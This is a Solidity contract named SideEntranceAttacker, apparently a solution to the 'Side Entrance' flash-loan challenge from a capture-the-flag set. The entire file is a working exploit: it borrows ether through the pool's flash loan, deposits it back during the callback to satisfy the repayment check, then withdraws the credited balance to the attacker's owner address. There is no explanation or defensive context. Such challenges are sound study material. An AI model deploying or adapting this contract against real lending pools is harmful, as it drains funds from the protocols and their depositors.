// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "./SideEntranceLenderPool.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/Address.sol";

contract SideEntranceAttacker is Ownable {
    using Address for address payable;
    SideEntranceLenderPool private pool;

    // pass pool address to the contract
    constructor(address poolAddress) {
        pool = SideEntranceLenderPool(poolAddress);
    }

    //  call flashloan with the Flasloan contract balance
    function getFlashloan(uint256 amount) public onlyOwner {
        pool.flashLoan(amount);
    }

    function execute() external payable {
        // re-deposit amount recieved from flashloan lender
        pool.deposit{value: address(this).balance}();
    }

    function withdraw() external onlyOwner {
        pool.withdraw();
    }

    receive() external payable {
        payable(owner()).sendValue(address(this).balance);
    }
}
